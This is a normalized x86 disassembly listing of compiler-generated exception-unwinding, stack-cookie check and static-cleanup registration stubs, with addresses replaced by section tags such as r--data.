sub_41d410
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6cc ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d438
lea ecx [ ebp - 0x2c ]
jmp sub_40203c
sub_41d440
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d465
lea ecx [ ebp + 0x20 ]
jmp sub_4020f4
sub_41d46d
lea ecx [ ebp + 0x8 ]
jmp sub_4020f4
sub_41d475
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_4020f4
sub_41d480
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d49b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x830 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d4c3
lea ecx [ ebp - 0x490 ]
jmp sub_40a4db
sub_41d4ce
lea ecx [ ebp - 0x48c ]
jmp sub_40a4db
sub_41d4d9
lea ecx [ ebp - 0x488 ]
jmp sub_40a4db
sub_41d4e4
lea ecx [ ebp - 0x480 ]
jmp sub_40a4db
sub_41d4ef
lea ecx [ ebp - 0x478 ]
jmp sub_40a4db
sub_41d4fa
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4d0 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d522
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_4020f4
sub_41d53b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d556
mov ecx [ ebp - 0x10 ]
add ecx 0x8
jmp sub_4020f4
sub_41d561
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_4020f4
sub_41d56c
mov ecx [ ebp - 0x10 ]
add ecx 0x38
jmp sub_4020f4
sub_41d577
mov ecx [ ebp - 0x10 ]
add ecx 0x50
jmp sub_40d733
sub_41d582
mov ecx [ ebp - 0x10 ]
add ecx 0x5c
jmp sub_40d733
sub_41d58d
mov ecx [ ebp - 0x10 ]
add ecx 0x68
jmp sub_40d733
sub_41d598
mov ecx [ ebp - 0x10 ]
add ecx 0x74
jmp sub_40d733
sub_41d5a3
mov ecx [ ebp - 0x10 ]
add ecx 0x84
jmp sub_4020f4
sub_41d5b1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d5cc
lea ecx [ ebp - 0x2c ]
jmp sub_4020f4
sub_41d5d4
lea ecx [ ebp - 0x44 ]
jmp sub_4020f4
sub_41d5dc
lea ecx [ ebp - 0x5c ]
jmp sub_4020f4
sub_41d5e4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x84 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d60c
lea ecx [ ebp + 0xc ]
jmp sub_4020f4
sub_41d614
lea ecx [ ebp - 0x18 ]
jmp j_sub_40ddd3
sub_41d61c
lea ecx [ ebp - 0x7c ]
jmp sub_4020f4
sub_41d624
lea ecx [ ebp - 0x34 ]
jmp sub_4020f4
sub_41d62c
lea ecx [ ebp - 0x94 ]
jmp sub_4020f4
sub_41d637
lea ecx [ ebp - 0x64 ]
jmp sub_4020f4
sub_41d63f
lea ecx [ ebp - 0x4c ]
jmp sub_4020f4
sub_41d647
lea ecx [ ebp - 0x34 ]
jmp sub_4020f4
sub_41d64f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d677
lea ecx [ ebp - 0x28 ]
jmp sub_4020f4
sub_41d67f
lea ecx [ ebp - 0x40 ]
jmp sub_4020f4
sub_41d687
lea ecx [ ebp - 0x2c0 ]
jmp sub_4020f4
sub_41d692
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2dc ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d6ba
lea ecx [ ebp - 0x848 ]
jmp sub_4020f4
sub_41d6c5
lea ecx [ ebp - 0x848 ]
jmp sub_4020f4
sub_41d6d0
lea ecx [ ebp - 0xad0 ]
jmp sub_4020f4
sub_41d6db
lea ecx [ ebp - 0x848 ]
jmp sub_4020f4
sub_41d6e6
lea ecx [ ebp - 0xab8 ]
jmp sub_4020f4
sub_41d6f1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xaec ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d719
lea ecx [ ebp - 0x28 ]
jmp sub_4020f4
sub_41d721
lea ecx [ ebp - 0x40 ]
jmp sub_4020f4
sub_41d729
lea ecx [ ebp - 0x2a8 ]
jmp sub_4020f4
sub_41d734
lea ecx [ ebp - 0x2d8 ]
jmp sub_4020f4
sub_41d73f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2f4 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d767
lea ecx [ ebp - 0x468 ]
jmp sub_4020f4
sub_41d772
lea ecx [ ebp - 0x450 ]
jmp sub_4020f4
sub_41d77d
lea ecx [ ebp - 0x438 ]
jmp sub_4020f4
sub_41d788
lea ecx [ ebp - 0x480 ]
jmp sub_4020f4
sub_41d793
lea ecx [ ebp - 0x498 ]
jmp sub_4020f4
sub_41d79e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4a4 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d7c6
lea ecx [ ebp - 0x40 ]
jmp sub_4020f4
sub_41d7ce
lea ecx [ ebp - 0x28 ]
jmp sub_4020f4
sub_41d7d6
lea ecx [ ebp - 0x70 ]
jmp sub_4020f4
sub_41d7de
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x74 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d803
lea ecx [ ebp - 0x5c ]
jmp sub_4020f4
sub_41d80b
lea ecx [ ebp - 0x44 ]
jmp sub_4020f4
sub_41d813
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d838
lea ecx [ ebp - 0x234 ]
jmp sub_4020f4
sub_41d843
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x23c ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d86b
lea ecx [ ebp - 0x2c ]
jmp sub_4020f4
sub_41d873
lea ecx [ ebp - 0x60 ]
jmp sub_4020f4
sub_41d87b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x64 ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_40e09b
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d8a3
mov eax [ ebp - 0x124 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x124 ] 0xfffffffe
mov ecx [ ebp - 0x128 ]
jmp sub_4020f4
sub_41d8c5
lea ecx [ ebp - 0x140 ]
jmp sub_4020f4
sub_41d8d0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x144 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d8f8
lea ecx [ ebp - 0x1c ]
jmp j_sub_40ddd3
sub_41d900
lea ecx [ ebp - 0x34 ]
jmp sub_4020f4
sub_41d908
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d92d
lea ecx [ ebp - 0x234 ]
jmp sub_4020f4
sub_41d938
lea ecx [ ebp - 0x23c ]
jmp j_sub_40ddd3
sub_41d943
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x25c ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d96b
lea ecx [ ebp - 0x30 ]
jmp sub_4020f4
sub_41d973
lea ecx [ ebp - 0x18 ]
jmp j_sub_40ddd3
sub_41d97b
lea ecx [ ebp - 0x48 ]
jmp sub_4020f4
sub_41d983
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x64 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41d9a8
lea ecx [ ebp - 0x188 ]
jmp sub_40d733
sub_41d9b3
lea ecx [ ebp - 0x14c ]
jmp sub_40203c
sub_41d9be
lea ecx [ ebp - 0x164 ]
jmp sub_4020f4
sub_41d9c9
lea ecx [ ebp - 0x17c ]
jmp sub_4020f4
sub_41d9d4
lea ecx [ ebp - 0x134 ]
jmp sub_4020f4
sub_41d9df
lea ecx [ ebp - 0x17c ]
jmp sub_4020f4
sub_41d9ea
lea ecx [ ebp - 0x17c ]
jmp sub_4020f4
sub_41d9f5
lea ecx [ ebp - 0x17c ]
jmp sub_4020f4
sub_41da00
lea ecx [ ebp - 0x17c ]
jmp sub_4020f4
sub_41da0b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x190 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41da33
lea ecx [ ebp - 0x238 ]
jmp sub_4020f4
sub_41da3e
lea ecx [ ebp - 0x2c8 ]
jmp sub_4020f4
sub_41da49
lea ecx [ ebp - 0x2b0 ]
jmp sub_4020f4
sub_41da54
lea ecx [ ebp - 0x298 ]
jmp sub_4020f4
sub_41da5f
lea ecx [ ebp - 0x280 ]
jmp sub_4020f4
sub_41da6a
lea ecx [ ebp - 0x250 ]
jmp sub_4020f4
sub_41da75
lea ecx [ ebp - 0x268 ]
jmp sub_4020f4
sub_41da80
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2d4 ]
mov ecx [ edx - 0x2d8 ]
xor ecx eax
call sub_40e09b
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41daae
lea ecx [ ebp + 0xc ]
jmp sub_4020f4
sub_41dab6
lea ecx [ ebp - 0x40 ]
jmp sub_4020f4
sub_41dabe
lea ecx [ ebp - 0x28 ]
jmp sub_4020f4
sub_41dac6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41daeb
lea ecx [ ebp + 0xc ]
jmp sub_4020f4
sub_41daf3
lea ecx [ ebp - 0x880 ]
jmp sub_40203c
sub_41dafe
lea ecx [ ebp - 0x8a0 ]
jmp sub_4020f4
sub_41db09
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x930 ]
xor ecx eax
call sub_40e09b
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_40e09b
mov eax r--data
jmp sub_410ced
sub_41db31
push sub_41dbd7
call sub_40e8b3
pop ecx
retn
sub_41db3d
push sub_41dbcc
call sub_40e8b3
pop ecx
retn
sub_41db49
push sub_41dbc1
call sub_40e8b3
pop ecx
retn
sub_41db55
push r--data
mov ecx rw-data
call sub_4022ce
push sub_41dbf1
call sub_40e8b3
pop ecx
retn
sub_41db70
push r--data
mov ecx rw-data
call sub_4022ce
push sub_41dc00
call sub_40e8b3
pop ecx
retn
sub_41db8b
push r--data
mov ecx rw-data
call sub_4022ce
push sub_41dc0f
call sub_40e8b3
pop ecx
retn
sub_41dba6
push r--data
mov ecx rw-data
call sub_4022ce
push sub_41dc1e
call sub_40e8b3
pop ecx
retn
sub_41dbc1
mov [ rw-data ] r--data
retn
sub_41dbcc
mov [ rw-data ] r--data
retn
sub_41dbd7
mov [ rw-data ] r--data
retn
sub_41dbe2
push 0x0
push 0x1
mov ecx rw-data
call sub_4023e7
retn
sub_41dbf1
push 0x0
push 0x1
mov ecx rw-data
call sub_4023e7
retn
sub_41dc00
push 0x0
push 0x1
mov ecx rw-data
call sub_4023e7
retn
sub_41dc0f
push 0x0
push 0x1
mov ecx rw-data
call sub_4023e7
retn
sub_41dc1e
push 0x0
push 0x1
mov ecx rw-data
call sub_4023e7
retn
